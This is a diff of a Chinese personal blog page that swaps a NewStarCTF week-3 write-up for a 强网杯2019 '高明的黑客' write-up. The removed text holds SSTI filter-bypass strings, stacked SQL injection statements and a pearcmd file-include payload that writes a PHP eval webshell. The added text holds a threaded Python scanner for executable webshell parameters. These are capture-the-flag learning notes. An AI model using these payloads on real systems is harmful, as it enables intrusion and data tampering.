@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   
   
-  <title>NewStarCTFweek3 | 无终的博客</title>
+  <title>CleverHacker | 无终的博客</title>
   <meta name="author" content="无终" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -16,34 +16,23 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="#NewstarCTFweek3学习记录##BabySSTI_One###解题  根据题目名，可以得知是SSTI模板注入。 根据提示可以得知注入点在name，通过get方法传入。 首先我们需要先判断题目使用的框架 &amp;#123;7*7&amp;#125; -&gt;49 -&gt; smarty &amp;#123;&amp;#123;7*&#39;7&#39;&amp;#125;&amp;#125; -&gt; 49 -&gt; twig &amp;#123;">
+  <meta name="description" content="#强网杯2019 高明的黑客##题目  打开题目，根据页面提示下载源码文件     打开下载后的源码文件 可以看到里面只有一个index.html文件，其他全是php文件，且内部写满了“看似”一句话木马的语句。   这就提示了我们需要在众多文件中找到一个能够使用的get或post请求 当然一个一个试是不可能的。 于是我们选择使用python脚本。 ##脚本脚本来源： 强网杯 2019]高明的黑客(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NewStarCTFweek3">
-<meta property="og:url" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/index.html">
+<meta property="og:title" content="CleverHacker">
+<meta property="og:url" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/index.html">
 <meta property="og:site_name" content="无终的博客">
-<meta property="og:description" content="#NewstarCTFweek3学习记录##BabySSTI_One###解题  根据题目名，可以得知是SSTI模板注入。 根据提示可以得知注入点在name，通过get方法传入。 首先我们需要先判断题目使用的框架 &amp;#123;7*7&amp;#125; -&gt;49 -&gt; smarty &amp;#123;&amp;#123;7*&#39;7&#39;&amp;#125;&amp;#125; -&gt; 49 -&gt; twig &amp;#123;">
+<meta property="og:description" content="#强网杯2019 高明的黑客##题目  打开题目，根据页面提示下载源码文件     打开下载后的源码文件 可以看到里面只有一个index.html文件，其他全是php文件，且内部写满了“看似”一句话木马的语句。   这就提示了我们需要在众多文件中找到一个能够使用的get或post请求 当然一个一个试是不可能的。 于是我们选择使用python脚本。 ##脚本脚本来源： 强网杯 2019]高明的黑客(">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101151722657.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101152044194.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101153118637.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101153246877.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101153625703.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101153821841.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101154022391.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101165842831.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101171629146.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101171821925.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101172056085.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101170204111.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101170334934.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221102201509776.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221102211941771.png">
-<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221102212122275.png">
-<meta property="article:published_time" content="2022-10-30T10:42:45.000Z">
-<meta property="article:modified_time" content="2022-11-03T01:49:10.136Z">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211141837727.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211142136204.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211142300752.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211142555350.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211145030022.png">
+<meta property="article:published_time" content="2022-12-11T06:17:31.000Z">
+<meta property="article:modified_time" content="2022-12-11T06:53:01.516Z">
 <meta property="article:author" content="无终">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/image-20221101151722657.png">
+<meta name="twitter:image" content="http://wuz-zhong.github.io/2022/12/11/CleverHacker/image-20221211141837727.png">
   
   <!-- 站点验证相关 -->
   
@@ -179,15 +168,15 @@
 
             <article itemscope itemtype="https://schema.org/Article">
     
-    <link itemprop="mainEntityOfPage" href="http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/">
+    <link itemprop="mainEntityOfPage" href="http://wuz-zhong.github.io/2022/12/11/CleverHacker/">
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center" itemprop="name headline">NewStarCTFweek3</h1>
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">CleverHacker</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><time datetime="2022-10-30T10:42:45.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-10-30</time></li>
+                <li><time datetime="2022-12-11T06:17:31.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-12-11</time></li>
                 <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                     <i class="fa fa-user"></i> 作者 <span itemprop="name">无终</span>
                 </li>
@@ -195,7 +184,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~1.74K
+                        ~3.19K
                     
                     字
                 </li>
@@ -206,87 +195,35 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1667440150136"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1670741581516"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
             
             <hr />
-            <div itemprop="articleBody"><h1 id="NewstarCTFweek3学习记录"><a href="#NewstarCTFweek3学习记录" class="headerlink" title="#NewstarCTFweek3学习记录"></a>#NewstarCTFweek3学习记录</h1><h2 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="##BabySSTI_One"></a>##BabySSTI_One</h2><h3 id="解题"><a href="#解题" class="headerlink" title="###解题"></a>###解题</h3><img src="/2022/10/30/NewStarCTFweek3/image-20221101151722657.png" class>
+            <div itemprop="articleBody"><h1 id="强网杯2019-高明的黑客"><a href="#强网杯2019-高明的黑客" class="headerlink" title="#强网杯2019 高明的黑客"></a>#强网杯2019 高明的黑客</h1><h2 id="题目"><a href="#题目" class="headerlink" title="##题目"></a>##题目</h2><img src="/2022/12/11/CleverHacker/image-20221211141837727.png" class>
 
-<p>根据题目名，可以得知是SSTI模板注入。</p>
-<p>根据提示可以得知注入点在name，通过get方法传入。</p>
-<p>首先我们需要先判断题目使用的框架</p>
-<p><code>&#123;7*7&#125; -&gt;49 -&gt; smarty</code></p>
-<p><code>&#123;&#123;7*'7'&#125;&#125; -&gt; 49 -&gt; twig</code></p>
-<p><code>&#123;&#123;7*'7'&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101152044194.png" class>
+<p>打开题目，根据页面提示下载源码文件</p>
+<img src="/2022/12/11/CleverHacker/image-20221211142136204.png" class>
 
-<p>根据测试我们可以知道使用的是jinjia2框架。</p>
-<p>通过HackBar我们可以快速构建payload。</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101153118637.png" class>
+<img src="/2022/12/11/CleverHacker/image-20221211142300752.png" class>
 
-<p>但是当执行后发现有些单词被过滤了</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101153246877.png" class>
+<p>打开下载后的源码文件</p>
+<p>可以看到里面只有一个index.html文件，其他全是php文件，且内部写满了“看似”一句话木马的语句。</p>
+<img src="/2022/12/11/CleverHacker/image-20221211142555350.png" class>
 
-<p>经过一个一个单词进行筛选，可以得知init被过滤了。</p>
-<p>通过字符拼接或者反转可以绕过</p>
-<p><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]</code><br><code>&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code><br><code>&quot;&quot;[&quot;__ssalc__&quot;][::-1]</code><br><code>&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></p>
-<p>这里选用拼接绕过</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101153625703.png" class>
+<p>这就提示了我们需要在众多文件中找到一个能够使用的get或post请求</p>
+<p>当然一个一个试是不可能的。</p>
+<p>于是我们选择使用python脚本。</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="##脚本"></a>##脚本</h2><p>脚本来源： <a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">强网杯 2019]高明的黑客(考察代码编写能力)_HyyMbb的博客-CSDN博客</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="comment"># 只是一个简单的时间函数，看起来更漂亮罢了</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)  <span class="comment"># 这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/phpstudy_pro/WWW/src/&quot;</span> <span class="comment">#注意路径，需要讲网站源码放入phpstudy开启的本地WWW目录下，buuctf上有请求上限。</span></span><br><span class="line">os.chdir(filePath)  <span class="comment"># 改变当前工作目录，为get_content()的参数file做简化，这样函数内就不用写全路径执行了。</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>  <span class="comment"># 设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)  <span class="comment"># 得到该目录下所有文件的名称</span></span><br><span class="line">session = requests.Session()  <span class="comment"># 得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = <span class="literal">False</span>  <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()  <span class="comment"># 线程锁，在该线程执行结束前，不允许别的线程调用。</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span> + file + <span class="string">&#x27;     &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="comment"># 更好看，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;&#x27;</span>, f.read()))    <span class="comment">#这里只匹配参数后面的第一个单引号就能把参数匹配出来</span></span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;&#x27;</span>, f.read()))  <span class="comment">#如果加上匹配]，就会提示是多余的正则</span></span><br><span class="line">    params = &#123;&#125;  <span class="comment"># 所有的$_GET</span></span><br><span class="line">    data = &#123;&#125;  <span class="comment"># 所有的$_POST</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>   <span class="comment">#这里是变成了键值对的形式&#123;params[m]:&quot;echo&quot;,params[m]:&quot;&quot;,...&#125;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + file   <span class="comment">#开启phpstudy后使用本地路径</span></span><br><span class="line">    req = session.post(url, data=data, params=params)  <span class="comment"># 一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()  <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:  <span class="comment"># 如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url + <span class="string">&#x27;?%s=&#x27;</span> % a + <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()  <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b: <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()  <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:  <span class="comment"># flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span> + file + <span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> % param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()  <span class="comment"># 线程锁释放</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:  <span class="comment"># 加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
 
-<p>可以发现成功执行，接下来我们读取flag文件。</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101153821841.png" class>
+<p>注意代码中的文件路径，因为做题网站上的请求次数是有限制的，所以我们需要将源码放在本地进行请求。</p>
+<p>使用phpstudy开启apache，在网站一栏点击“管理”-》“打开根目录”.</p>
+<p>将源码内的src文件夹整个放入WWW目录下,然后运行代码即可。</p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="##结果"></a>##结果</h2><img src="/2022/12/11/CleverHacker/image-20221211145030022.png" class>
 
-<p>但是发现cat和flag都被过滤了，这时我们可以用tail来读取文件，并用&#x2F;fl* 来匹配&#x2F;flag</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101154022391.png" class>
-
-<h2 id="multiSQL"><a href="#multiSQL" class="headerlink" title="##multiSQL"></a>##multiSQL</h2><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="###解题"></a>###解题</h3><p>打开题目，输入火华，查看火华成绩</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101165842831.png" class>
-
-<p>根据提示，应该是利用sql注入中的堆叠注入，修改火华的成绩，使其总成绩达到425.</p>
-<p>首先爆库</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101171629146.png" class>
-
-<p>成绩应该在english库中，然后报表</p>
-<p><code>1&#39;;show tables from english#</code></p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101171821925.png" class>
-
-<p>可以知道表名为score</p>
-<p>接下来爆字段</p>
-<p><code>1&#39;;show columns from score#</code></p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101172056085.png" class>
-
-<p>接下来尝试堆叠注入修改成绩。</p>
-<p>但是经过尝试，可以得知updata被过滤掉了。</p>
-<p>我们利用 replace 方法来添加新的数据</p>
-<p><code>1&#39;;replace INTO  score  VALUES (&quot;火华&quot;,50,200,200);#</code></p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101170204111.png" class>
-
-<p>可以看到我们添加了一行新的火华数据。</p>
-<p>接着我们要做的就是删除旧的火华数据。</p>
-<p><code>1&#39;;delete from score where listen=11;#</code></p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221101170334934.png" class>
-
-<p>可以看到成绩已经删除，点击验证成绩，即可获得flag。</p>
-<h2 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="##IncludeTwo"></a>##IncludeTwo</h2><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="###解题"></a>###解题</h3><img src="/2022/10/30/NewStarCTFweek3/image-20221102201509776.png" class>
-
-<p>很明显可以看出是一个文件包含漏洞，但是这个过滤让我直接止步于此了。</p>
-<p>后来看来别人的wp，学习到了新的知识，才知道怎么去做。</p>
-<p>首先是该知识的来源与其详解</p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a></p>
-<p>将该博客看至最后，可以学习到新的方法。</p>
-<p>即pearcmd的利用。</p>
-<p><code>config-create</code>该命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
-<p>payload为(注意该操作需要在bp中完成，否则会失败，原因我尚不清楚)</p>
-<p><code>http://99194f4c-8140-4701-a84d-888ade77f1e2.node4.buuoj.cn:81/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;+/tmp/cmd.php</code></p>
-<p>这样<code>&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>就会被写入cmd.php中</p>
-<p>接下来直接访问并传入参数cmd&#x3D;system(‘ls &#x2F;‘)即可。(该操作可直接在hackbar中完成,传入的参数不需要加’.php’)</p>
-<img src="/2022/10/30/NewStarCTFweek3/image-20221102211941771.png" class>
-
-<img src="/2022/10/30/NewStarCTFweek3/image-20221102212122275.png" class>
-
-<h2 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="##Maybe You Have To think More"></a>##Maybe You Have To think More</h2><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="###解题"></a>###解题</h3><p>太难了看不懂。。。。。</p>
+<p>找到了可以使用的参数和文件名，接下来直接利用即可。</p>
 </div>
         </div>
         
@@ -340,7 +277,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/",
+                text: "http://wuz-zhong.github.io/2022/12/11/CleverHacker/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -352,14 +289,20 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://wuz-zhong.github.io/2022/10/30/NewStarCTFweek3/";
-            const title         = "「NewStarCTFweek3」";
-            const excerpt       = `#NewstarCTFweek3学习记录##BabySSTI_One###解题
+            const hostUrl       = "http://wuz-zhong.github.io/2022/12/11/CleverHacker/";
+            const title         = "「CleverHacker」";
+            const excerpt       = `#强网杯2019 高明的黑客##题目
 
-根据题目名，可以得知是SSTI模板注入。
-根据提示可以得知注入点在name，通过get方法传入。
-首先我们需要先判断题目使用的框架
-&#123;7*7&...`;
+打开题目，根据页面提示下载源码文件
+
+
+
+
+打开下载后的源码文件
+可以看到里面只有一个index.html文件，其他全是php文件，且内部写满了“看似”一句话木马的语句。
+
+
+这就提示了我们需要...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -381,7 +324,7 @@
                     
                 </div>
                 <div class="pull-date">
-                    <time datetime="2022-11-03T01:49:10.136Z" itemprop="dateModified">最后编辑：2022-11-03</time>
+                    <time datetime="2022-12-11T06:53:01.516Z" itemprop="dateModified">最后编辑：2022-12-11</time>
                 </div>
             </div>
         </footer>
@@ -390,13 +333,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" NewStarCTFweek2" href="/2022/10/23/NewStarCTFweek2/">&lt; 上一篇</a>
+                <a title=" BabySSTI_Two" href="/2022/11/03/BabySSTI-Two/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" BabySSTI_Two" href="/2022/11/03/BabySSTI-Two/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
